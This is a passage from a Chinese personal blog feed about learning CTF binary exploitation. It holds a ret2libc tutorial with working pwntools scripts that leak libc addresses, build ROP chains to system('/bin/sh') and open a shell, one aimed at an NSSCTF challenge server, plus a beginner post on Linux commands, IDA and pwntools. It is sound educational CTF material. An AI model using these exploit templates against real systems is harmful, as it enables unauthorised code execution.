data-num=\"13\"></td><td><pre>    最后的payload<span class=\"token operator\">=</span>垃圾字节<span class=\"token operator\">+</span>（eax<span class=\"token operator\">-</span>ret<span class=\"token operator\">+</span>ebx<span class=\"token operator\">-</span>ret<span class=\"token operator\">+</span>ecx<span class=\"token operator\">-</span>ret<span class=\"token operator\">+</span>edx<span class=\"token operator\">-</span>ret<span class=\"token operator\">+</span><span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span>sh<span class=\"token operator\">+</span><span class=\"token number\">0x80</span>）<span class=\"token operator\">-></span>的地址</pre></td></tr></table></figure><h1 id=\"ret2libc\"><a class=\"anchor\" href=\"#ret2libc\">#</a> ret2libc</h1>\n<p><em>没有后门函数同时开启 NX 保护</em><br />\n<em>一般有 puts ()、printf ()、writes () 等，且使用了 libc 库</em></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Jvc3NmcmFuay9hcnRpY2xlL2RldGFpbHMvMTM0ODcyNDAz\">取自大佬博客！！我愿称之为神！大彻大悟！醍醐灌顶！</span></p>\n<p>函数的真实地址   =   基地址   +   偏移地址<br />\n<img data-src=\"https://s2.loli.net/2024/06/02/gSdqK57pXoLvDkU.jpg\" alt=\"\" /></p>\n<p><em>呜呜呜，更一下，ldd filename 就可以查看文件本地的 libc 版本 555</em><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZmFsbGluZy1kdXNrL3AvMTc4NTYxNDEuaHRtbA==\">https://www.cnblogs.com/falling-dusk/p/17856141.html</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZmFsbGluZy1kdXNrL3AvMTc4NTYxNDEuaHRtbA==\">https://www.cnblogs.com/falling-dusk/p/17856141.html</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9yajQ1bXAuZ2l0aHViLmlvLyVFNiVCNyVCMSVFNSU4NSVBNSVFNyU5MCU4NiVFOCVBNyVBM3JldDJsaWJjLw==\">https://rj45mp.github.io/ 深入理解 ret2libc/</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxMDMyODA3L2FydGljbGUvZGV0YWlscy8xMTQ4MDgzMzk=\">https://blog.csdn.net/qq_51032807/article/details/114808339</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01yX0Ztbndvbi9hcnRpY2xlL2RldGFpbHMvMTMwOTU5MTIz\">https://blog.csdn.net/Mr_Fmnwon/article/details/130959123</span><br />\n 先上板子</p>\n<h2 id=\"32位\"><a class=\"anchor\" href=\"#32位\">#</a> 32 位</h2>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>from pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token function\">ELF</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./ret2libc3_32\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token function\">ELF</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/lib/i386-linux-gnu/libc.so.6\"</span><span class=\"token punctuation\">)</span> #确定libc库并解析</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token function\">process</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./ret2libc3_32\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>puts_plt <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token char\">'puts'</span><span class=\"token punctuation\">]</span> #puts函数的入口地址</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>puts_got <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token char\">'puts'</span><span class=\"token punctuation\">]</span>  #puts函数的got表地址</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>start_addr <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token char\">'_start'</span><span class=\"token punctuation\">]</span> #程序的起始地址</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>payload1 <span class=\"token operator\">=</span> b<span class=\"token char\">'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">112</span> <span class=\"token operator\">+</span> <span class=\"token function\">p32</span><span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token function\">p32</span><span class=\"token punctuation\">(</span>start_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token function\">p32</span><span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>#<span class=\"token function\">attach</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">\"b *0x0804868F\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>#<span class=\"token function\">pause</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span><span class=\"token function\">sendlineafter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Can you find it !?\"</span><span class=\"token punctuation\">,</span> payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>puts_real_addr <span class=\"token operator\">=</span> <span class=\"token function\">u32</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">recv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token operator\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  #接收puts的真实地址，占<span class=\"token number\">4</span>个字节</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"puts_plt:&#123;&#125;, puts_got: &#123;&#125;, start_addr: &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token function\">hex</span><span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token function\">hex</span><span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">hex</span><span class=\"token punctuation\">(</span>start_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"puts_real_addr: \"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">hex</span><span class=\"token punctuation\">(</span>puts_real_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>libc_addr <span class=\"token operator\">=</span> puts_real_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token char\">'puts'</span><span class=\"token punctuation\">]</span> #计算libc库的基地址</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token function\">hex</span><span class=\"token punctuation\">(</span>libc_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>system_addr <span class=\"token operator\">=</span> libc_addr <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">]</span> #计算system函数的真实地址</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>binsh_addr <span class=\"token operator\">=</span> libc_addr <span class=\"token operator\">+</span> <span class=\"token function\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span><span class=\"token function\">search</span><span class=\"token punctuation\">(</span>b<span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  #计算binsh字符串的真实地址</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>payload2 <span class=\"token operator\">=</span> b<span class=\"token char\">'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">112</span> <span class=\"token operator\">+</span> <span class=\"token function\">p32</span><span class=\"token punctuation\">(</span>system_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> b<span class=\"token string\">\"aaaa\"</span> <span class=\"token operator\">+</span> <span class=\"token function\">p32</span><span class=\"token punctuation\">(</span>binsh_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>#<span class=\"token function\">pause</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span><span class=\"token function\">sendline</span><span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p<span class=\"token punctuation\">.</span><span class=\"token function\">interactive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"64位\"><a class=\"anchor\" href=\"#64位\">#</a> 64 位</h2>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload <span class=\"token operator\">=</span> b<span class=\"token string\">\"a\"</span> <span class=\"token operator\">*</span> offset #垃圾数据的填充</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>payload <span class=\"token operator\">+=</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>pop_rdi_ret_addr<span class=\"token punctuation\">)</span> #用寄存器rdi传参，参数是read_got</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payload <span class=\"token operator\">+=</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>read_got<span class=\"token punctuation\">)</span> #想要存入rdi的参数</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>payload <span class=\"token operator\">+=</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span> #puts的入口地址，即plt表的地址</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>payload <span class=\"token operator\">+=</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>main_addr<span class=\"token punctuation\">)</span> #程序的起始地址</pre></td></tr></table></figure><h3 id=\"板子\"><a class=\"anchor\" href=\"#板子\">#</a> 板子</h3>\n<blockquote>\n<p>from pwn import *<br />\nlibc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)<br />\np = process(&quot;ret2libc&quot;)<br />\npop_rdi_ret_addr = 0x401293<br />\nread_got = 0x403368<br />\nputs_plt = 0x401060<br />\nmain_addr = 0x401176<br />\noffset = 40<br />\npayload = b&quot;a&quot; * offset<br />\npayload += p64(pop_rdi_ret_addr)<br />\npayload += p64(read_got)<br />\npayload += p64(puts_plt)<br />\npayload += p64(main_addr)<br />\n#attach(p,&quot;b *0x40121e&quot;)<br />\np.recvuntil(&quot;Pls Input&quot;)<br />\n#pause()<br />\np.send(payload)<br />\n read_real_addr = u64 (p.recvuntil ('\\x7f')[-6:].ljust (8, b'\\x00'))  #read 函数的真实地址，由于真实地址总是从 7f 开始，故从 7f 开始接收，长度补足 8 个字节<br />\n print (&quot;read_real_addr:&quot;, hex (read_real_addr))</p>\n</blockquote>\n<p>剩下的和 32 位的一样</p>\n<p>一个大佬的 64 位样例</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>from pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>                 #pwntools</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>from <span class=\"token class-name\">LibcSearcher</span> <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>        #定位libc函数以及特殊字符串<span class=\"token punctuation\">;</span>题目没给libc！！至少在nssctf目前还没授权，也没正确的libc附件，但是我们有强大的<span class=\"token class-name\">LibcSearcher</span>库</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>elf<span class=\"token operator\">=</span><span class=\"token function\">ELF</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./babyof\"</span><span class=\"token punctuation\">)</span>               #获取got<span class=\"token operator\">/</span>plt等程序信息</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">context</span><span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">\"amd64\"</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">\"debug\"</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">\"linux\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>pop_ret_rdi_addr<span class=\"token operator\">=</span><span class=\"token number\">0x400743</span>\t        #<span class=\"token number\">64l</span>inux，用于参数填入函数</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>puts_plt_addr<span class=\"token operator\">=</span><span class=\"token number\">0x400520</span>            #用于调用puts，打印（泄露）got表填写的函数真实地址</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>main_addr<span class=\"token operator\">=</span><span class=\"token number\">0x40066b</span>                #用于返回main函数，准备第二次栈溢出（？）</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>ret<span class=\"token operator\">=</span><span class=\"token number\">0x400506</span>                      #用于返回，否则出错（？）</pre></td></tr><tr><td data-num=\"11\"></td><td><pre> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>io<span class=\"token operator\">=</span><span class=\"token function\">remote</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"node4.anna.nssctf.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28715</span><span class=\"token punctuation\">)</span>  #远程连接</pre></td></tr><tr><td data-num=\"13\"></td><td><pre> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>payload<span class=\"token operator\">=</span>b<span class=\"token char\">'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>             #溢出</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>payload<span class=\"token operator\">+=</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>pop_ret_rdi_addr<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>     #pop和栈上填写信息连用，实际效果是将填入栈的值传给寄存器，这一点值得记下来；填写了puts要打印的内容是got表puts的真实地址</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>payload<span class=\"token operator\">+=</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>puts_plt_addr<span class=\"token punctuation\">)</span>       #puts的plt地址，用于（参数准备好后）调用call puts</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>payload<span class=\"token operator\">+=</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>main_addr<span class=\"token punctuation\">)</span>           #因为是<span class=\"token keyword\">return</span> <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"I hope you win\"</span><span class=\"token punctuation\">)</span>，而此时栈上已经一塌糊涂，我们手动让程序执行流回到main准备下一次溢出</pre></td></tr><tr><td data-num=\"18\"></td><td><pre> </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>io<span class=\"token punctuation\">.</span><span class=\"token function\">sendlineafter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"overflow?\\n\"</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>  #在此之后就是read，读取我们的payload。效果：打印puts的真实地址，然后返回main函数，准备在此栈溢出</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>io<span class=\"token punctuation\">.</span><span class=\"token function\">recvuntil</span><span class=\"token punctuation\">(</span><span class=\"token char\">'win\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>puts_real_addr<span class=\"token operator\">=</span><span class=\"token function\">u64</span><span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">.</span><span class=\"token function\">recvuntil</span><span class=\"token punctuation\">(</span><span class=\"token char\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token operator\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">ljust</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>b<span class=\"token char\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  #直到读取到\\x7f结束符，然后截取后六位（地址），ljust转<span class=\"token number\">8</span>字节补齐，u64转为无符号整数</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>#一个地址的最高位的两个字节是<span class=\"token number\">00</span>，而且实际栈地址一般是<span class=\"token number\">0</span>x7fxxxx开头的，因此为了避免获取错误的地址值，只需要获取前面的<span class=\"token number\">6</span>字节值，然后通过ljust函数把最高位的两字节填充成<span class=\"token number\">00</span>。</pre></td></tr><tr><td data-num=\"23\"></td><td><pre> </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>#<span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span>之所以称为ret2libc：<span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc<span class=\"token operator\">=</span><span class=\"token class-name\">LibcSearcher</span><span class=\"token punctuation\">(</span><span class=\"token char\">'puts'</span><span class=\"token punctuation\">,</span>puts_real_addr<span class=\"token punctuation\">)</span>         #<span class=\"token class-name\">LibcSearcher</span><span class=\"token punctuation\">,</span>通过函数名和函数真实地址来找到对应的libc（之后会做选择，选择正确的那个即可） </pre></td></tr><tr><td data-num=\"26\"></td><td><pre>libc_addr<span class=\"token operator\">=</span>puts_real_addr<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span><span class=\"token function\">dump</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">)</span>       #libc的真实的基址<span class=\"token operator\">=</span>puts的真实地址<span class=\"token operator\">-</span>puts相对于libc基址的偏移量</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>bin_sh_addr<span class=\"token operator\">=</span>libc_addr<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span><span class=\"token function\">dump</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"str_bin_sh\"</span><span class=\"token punctuation\">)</span>    #'<span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span>sh'的真实地址<span class=\"token operator\">=</span>libc基址的真实地址<span class=\"token operator\">+</span>'<span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span>sh'相对于libc基址的偏移量</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>system_real_addr<span class=\"token operator\">=</span>libc_addr<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span><span class=\"token function\">dump</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">)</span>   #system函数的真实地址<span class=\"token operator\">=</span>libc基址的真实地址<span class=\"token operator\">+</span>system函数相对于libc基址的偏移量</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>#<span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre> </pre></td></tr><tr><td data-num=\"31\"></td><td><pre>payload2<span class=\"token operator\">=</span>b<span class=\"token char\">'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>            #栈溢出</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>payload2<span class=\"token operator\">+=</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span>                #就是这里，其实不太明白。为什么不直接开始下一步（去掉ret），但是会出错。我的理解是，puts函数跳回，然后在</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>payload2<span class=\"token operator\">+=</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>pop_ret_rdi_addr<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>bin_sh_addr<span class=\"token punctuation\">)</span>#system函数的参数准备，即把'<span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span>sh'（的地址）传入 </pre></td></tr><tr><td data-num=\"34\"></td><td><pre>payload2<span class=\"token operator\">+=</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>system_real_addr<span class=\"token punctuation\">)</span>   #调用system</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>payload2<span class=\"token operator\">+=</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>main_addr<span class=\"token punctuation\">)</span>          #只是为了能够找到一个合法地址（？） </pre></td></tr><tr><td data-num=\"36\"></td><td><pre> </pre></td></tr><tr><td data-num=\"37\"></td><td><pre>io<span class=\"token punctuation\">.</span><span class=\"token function\">sendlineafter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"overflow?\\n\"</span><span class=\"token punctuation\">,</span>payload2<span class=\"token punctuation\">)</span>         #栈溢出点发送payload</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>io<span class=\"token punctuation\">.</span><span class=\"token function\">recv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>                         #吸收一下发过来的数据，没必要</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>io<span class=\"token punctuation\">.</span><span class=\"token function\">interactive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>                  #开始交互，ls <span class=\"token operator\">-></span> cat flag</pre></td></tr></table></figure><p><s>好啦好啦，要刷题啦（）</s></p>\n",
            "tags": [
                "Pwn",
                "stack"
            ]
        },
        {
            "id": "http://jexy-kynner.github.io/2024/05/11/%E5%89%8D%E7%BD%AE/",
            "url": "http://jexy-kynner.github.io/2024/05/11/%E5%89%8D%E7%BD%AE/",
            "title": "前置",
            "date_published": "2024-05-10T17:40:39.000Z",
            "content_html": "<p>既然是记录学习历程，我觉得还是从头开始吧<br />\n我刚开始学的时候就苦于找不到学习资源，找到了又看不懂的崩溃处境<br />\n<strong>好吧，是我不会科学上网 + 本人又菜又摆的缘故</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>一般是从比赛官方下载附件</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> 下载到虚拟机 打开terminal——checksec 查看保护机制</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> （拖进IDA/利用GDB，然后<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>此处省略脑子）</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> 编写脚本<span class=\"token punctuation\">(</span>用python<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> 运行exp.py—<span class=\"token operator\">></span>ls—<span class=\"token operator\">></span>cat flag</pre></td></tr></table></figure><h1 id=\"linux系统命令在虚拟机中使用\"><a class=\"anchor\" href=\"#linux系统命令在虚拟机中使用\">#</a> Linux 系统命令（在虚拟机中使用）</h1>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nc——远端 </pre></td></tr><tr><td data-num=\"2\"></td><td><pre> ls——查看目录下文件</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token function\">cat</span> flag——获得flag</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> cd——打开文件</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> <span class=\"token function\">touch</span> 文件名——创建文件</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> vim——编辑</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> <span class=\"token function\">chmod</span> +x ./文件名  ~或~chmod <span class=\"token number\">777</span> ./文件名——给文件赋权限</pre></td></tr><tr><td data-num=\"8\"></td><td><pre> python 脚本名.py——运行脚本</pre></td></tr><tr><td data-num=\"9\"></td><td><pre> <span class=\"token function\">rm</span> <span class=\"token parameter variable\">-rf</span> 文件名——删除文件</pre></td></tr></table></figure><h1 id=\"ida使用\"><a class=\"anchor\" href=\"#ida使用\">#</a> IDA 使用</h1>\n<ul>\n<li>Tab 键从 C 语言和汇编之间切换</li>\n<li>f5 从汇编到 C 语言</li>\n<li>单击函数 + 按 n—— 重命名函数（或者右键 rename）</li>\n<li>Options-&gt;General-&gt;Disassembly-&gt;Line Prefixes—— 看地址</li>\n<li>shift+f12—— 查看字符串，一般利用它看看有没有后门函数，\\bin\\sh 之类的东西</li>\n</ul>\n<h1 id=\"pwntools\"><a class=\"anchor\" href=\"#pwntools\">#</a> pwntools</h1>\n<p>from pown import*   // 调用 pwntools<br />\np=p.process (&quot;文件名&quot;) // 本地运行<br />\n p=remote (&quot;ip&quot;,port)// 打远端<br />\n p.send（）发送消息，消息不存在换行符<br />\n p.sendafter (&quot;&quot;)// 在读到 “” 之后发送<br />\n p.sendline ()—— 发送信息后换行<br />\n p.recvline（）接收并等待提示消息<br />\n p.interactive：进入交互模式，最后写<br />\n p.recvuntil (字符串)：接收并等待提示消息<br />\n gdb.attach (p, ’b * 0xfa’)：启动 gdb<br />\np64、p32—— 根据设置的 context 选择小端法或大端法对数字进行编码</p>\n<h1 id=\"汇编\"><a class=\"anchor\" href=\"#汇编\">#</a> 汇编</h1>\n<p><img 